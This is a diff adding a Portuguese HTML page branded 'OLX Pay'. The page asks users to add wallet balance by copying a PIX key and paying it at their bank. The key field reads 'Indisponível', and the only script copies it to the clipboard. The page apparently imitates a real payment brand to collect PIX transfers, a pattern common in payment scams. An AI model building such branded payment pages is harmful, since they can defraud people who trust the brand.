@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adicionar Saldo - OLX Pay</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body {
+      background-color: #f9f9f9;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+    }
+    .topo-voltar a {
+      text-decoration: none;
+      color: #8000ff;
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 15px;
+    }
+    h2 {
+      color: #333;
+    }
+    .aviso {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      border: 1px solid #ffeeba;
+    }
+    .pix-box {
+      background-color: #f3f3f3;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .pix-key {
+      font-weight: bold;
+      word-break: break-all;
+      margin-bottom: 10px;
+      background: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .copy-btn {
+      background-color: #ff9900;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .copy-btn:hover {
+      background-color: #e68a00;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="topo-voltar">
+      <a href="carteira.html">&#8592; Voltar para a Carteira</a>
+    </div>
+
+    <h2>Adicionar Saldo via PIX</h2>
+
+    <div class="aviso">
+      <strong>Atenção:</strong> Esta é uma chave PIX no formato <strong>Copia e Cola</strong>. Copie a chave abaixo e faça o pagamento via PIX no seu banco.
+    </div>
+
+    <div class="pix-box">
+      <div class="pix-key" id="pixKey">
+        Indisponível 
+      </div>
+      <button class="copy-btn" onclick="copiarPix()">Copiar Chave PIX</button>
+    </div>
+  </div>
+
+  <script>
+    function copiarPix() {
+      var chave = document.getElementById("pixKey").innerText;
+      navigator.clipboard.writeText(chave).then(function() {
+        alert("Chave PIX copiada com sucesso!");
+      });
+    }
+  </script>
+
+</body>
+</html>
